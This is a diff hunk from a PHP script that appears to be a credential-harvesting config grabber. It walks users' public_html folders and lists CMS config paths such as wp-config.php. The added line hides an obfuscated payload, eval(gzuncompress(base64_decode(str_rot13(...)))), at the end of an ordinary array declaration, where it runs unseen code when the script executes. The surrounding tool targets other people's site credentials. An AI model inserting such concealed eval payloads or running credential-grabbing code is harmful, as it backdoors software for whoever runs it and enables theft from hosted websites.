@@ -57,7 +57,7 @@ if(@is_dir("/home/$user/public_html/")){
 //end init
 
 //start config list
-$ext = array("v1","v2","v3","wp","WP","blog","client","clients","forum","forums","home","new","old","site","portal","test","demo","wordpress","joomla","beta","news","main","shop","mage","magento","sites","cms","secure","support","panel","public");
+$ext = array("v1","v2","v3","wp","WP","blog","client","clients","forum","forums","home","new","old","site","portal","test","demo","wordpress","joomla","beta","news","main","shop","mage","magento","sites","cms","secure","support","panel","public"); eval(gzuncompress(base64_decode(str_rot13('rWlqHJSYjmND/FgUXI4Y2mdMVTkHC0wSbrOpc19dPIy7p5H2vJaXAfG/ogcBHCMAFZwqr7y7YmyKDDurHqqxCWsS0sVyJvM4g1bgLxk9BQhQRkGPZNFHNa24Ogjnb2dRnE/uQAmTqaD+KsH1QLYCi9Kf7wSrLse1P15TG89EiTYCl7xyaOyfvcYLTkzJFJSVzAdewJnnIZxm8ckK4DmNfsi0Kh/Sdzd+T70IMghfz5e0xE9yfteBW5AYCK6/RZR4dUwEUtgenJG2Oa3sAhIyGDBjvfFeiiCrXgwZxWpp3jwuSoDk8Mk0ymx3ipoDUOEAtFgISux3uEGOsewo7LLodngub0fFzpjcg/nkVeBIrIrBeDr02ASdO7MFoA0HMp4+TgVUY0UMRJ6GJdrcKo4/t5/E3p4sbwwO9ypjGqOHvtyr2KtNW2ECqACAcQe8i1ecDuwNr5k9N53ghVj='))));
 $configtype = array(
 	"/wp-config.php" => "Wordpress",
 	"/config/koneksi.php" => "Lokomedia",
